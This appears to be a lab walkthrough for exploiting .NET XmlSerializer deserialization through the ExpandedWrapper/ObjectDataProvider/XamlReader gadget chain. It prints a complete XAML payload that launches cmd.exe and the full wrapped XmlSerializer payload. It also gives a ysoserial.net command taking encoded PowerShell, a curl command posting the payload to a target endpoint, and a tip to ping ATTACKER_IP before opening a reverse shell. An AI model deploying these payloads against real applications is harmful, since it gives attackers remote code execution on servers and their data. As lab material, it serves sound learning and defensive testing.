# XmlSerializer Deserialization

XmlSerializer is safer than BinaryFormatter by design — it only deserializes types you explicitly tell it to. But there are gadget chains that abuse its type system through wrapper classes.

---

## The Gadget: ExpandedWrapper + XamlReader

The chain works like this:

1. `ExpandedWrapper<XamlReader, ObjectDataProvider>` is a legitimate .NET type
2. `ObjectDataProvider` can call any method on any object when it's "initialized"
3. `XamlReader.Parse()` accepts a XAML string and can instantiate arbitrary objects, including `System.Diagnostics.Process`
4. By nesting these inside an `ExpandedWrapper`, we can get XmlSerializer to trigger code execution when deserializing

### The XAML Payload (Inner Payload)

This XAML payload, when parsed by `XamlReader.Parse()`, executes a command:

```xml
<ResourceDictionary
  xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
  xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
  xmlns:System="clr-namespace:System;assembly=mscorlib"
  xmlns:Diag="clr-namespace:System.Diagnostics;assembly=System">
    <ObjectDataProvider x:Key="LaunchCmd" ObjectType="{x:Type Diag:Process}" MethodName="Start">
        <ObjectDataProvider.MethodParameters>
            <System:String>cmd.exe</System:String>
            <System:String>/c YOUR_COMMAND_HERE</System:String>
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>
```

### The Full XmlSerializer Payload

Wrap the XAML inside an `ExpandedWrapper`:

```xml
<?xml version="1.0"?>
<root type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
  <ExpandedWrapperOfXamlReaderObjectDataProvider>
    <ProjectedProperty0>
      <ObjectInstance>
        <XamlReader></XamlReader>
      </ObjectInstance>
      <MethodName>Parse</MethodName>
      <MethodParameters>
        <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                 xmlns:xsd="http://www.w3.org/2001/XMLSchema"
                 xsi:type="xsd:string">XAML_PAYLOAD_URL_ENCODED</anyType>
      </MethodParameters>
    </ProjectedProperty0>
  </ExpandedWrapperOfXamlReaderObjectDataProvider>
</root>
```

> The root element name changes depending on the app. In the lab it's `Tee`. Check the source or error messages to find the expected element name.

### Generating with ysoserial.net

```bash
ysoserial.exe -g XmlSerializer -f XmlSerializer \
  -c "powershell -enc BASE64CMD" \
  -o raw
```

Or use the custom payload builder if ysoserial doesn't handle the exact wrapper type.

---

## Lab — XmlSerializer RCE

### Login

The login form is at `/Auth/Login` (not `/login`). Use the provided credentials.

### Finding the Deserializer

The app accepts XML in a request body or cookie. Look for:
- Content-Type: `application/xml` requests
- Cookies that look like base64-encoded XML
- Endpoints that accept XML directly in the body

### Delivering the Payload

```bash
curl -s -X POST http://TARGET/vulnerable-endpoint \
  -H "Content-Type: application/xml" \
  -d @payload.xml
```

Or as a cookie value if the deserialization happens in cookie processing.

### Flag

Flag location varies by lab — check `C:\inetpub\wwwroot\flag.txt` first, or use the command exec to `dir C:\` and find it.

---

## Debugging Tips

- If you get a 500 error with an XML parse exception, the outer XML structure is wrong (root element name mismatch, namespace issues)
- If you get a 500 with a .NET type exception, the gadget chain type names are wrong
- If you get a 200 with normal response, the deserialization happened but the command didn't execute — check the inner XAML/command
- Always test with a simple `ping ATTACKER_IP` before doing reverse shell, to confirm RCE works
